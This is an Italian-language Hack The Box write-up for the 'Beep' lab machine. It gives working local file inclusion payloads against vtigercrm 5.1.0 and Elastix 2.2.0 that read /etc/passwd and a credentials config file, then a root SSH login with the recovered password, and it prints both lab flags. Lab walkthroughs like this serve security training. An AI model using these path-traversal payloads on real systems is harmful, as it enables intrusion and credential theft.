![](beep.png)
# Beep -Hack The Box Writeup
## scansione nmap
```bash
nmap -sCV -O iptarget
```
## impostiamo tls alla versione minima 1 invece di 3
```bash
about:config
security.tls.version.min
1
```
## dirbuster
scopriamo che vtigercrm 5.1.0 e' vulnerabile a LFI
```bash
https://10.129.229.183/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```
abbiamo un utente
```bash 
fanis:x:501:501::/home/fanis:/bin/bash
```
quindi otteniamo la flag
```bash
https://10.129.229.183/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../home/fanis/user.txt%00
```
# Flag user
## 28c2ce9206fe652b4606500980ddc149

# PRIVILEGE ESCALATION (si poteva completare la macchina anche solo con questo passaggio)

## Elastix 2.2.0 - 'graph.php' Local File Inclusion
```bash 
https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
otteniamo un file di testo con username e password
entriamo come root ssh
rendiamo compatibile ssh impostando questi algoritmi
```bash
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
    root@10.129.229.183
    password:jEhdIekWmdjE
```
```bash
whoami
root
cat root.txt
```
# Flag root
## 2aa48afe3203dfc84ee8810e0e1bcdee
